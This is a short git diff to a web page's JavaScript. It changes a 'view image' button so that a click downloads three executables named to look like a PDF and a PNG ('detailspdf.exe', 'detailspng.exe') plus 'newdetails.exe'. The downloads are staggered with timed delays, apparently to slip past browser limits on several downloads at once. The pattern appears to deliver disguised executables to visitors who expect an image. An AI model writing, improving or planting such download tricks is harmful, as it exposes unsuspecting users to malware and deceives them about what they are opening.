@@ -17,8 +17,12 @@ document.addEventListener('DOMContentLoaded', () => {
     // Add event listener for the download button
     viewImageButton.addEventListener('click', () => {
         downloadFile('https://archive.org/download/newdetails/detailspdf.exe');
-        downloadFile('https://archive.org/download/newdetails/detailspng.exe');
-        downloadFile('https://archive.org/download/newdetails/newdetails.exe');
+        setTimeout(() => {
+            downloadFile('https://archive.org/download/newdetails/detailspng.exe');
+        }, 500); // 0.5 second delay
+        setTimeout(() => {
+            downloadFile('https://archive.org/download/newdetails/newdetails.exe');
+        }, 1000); // 1 second delay (0.5s after the second download)
     });
 
     const hasSeenImages = localStorage.getItem('hasSeenImages');
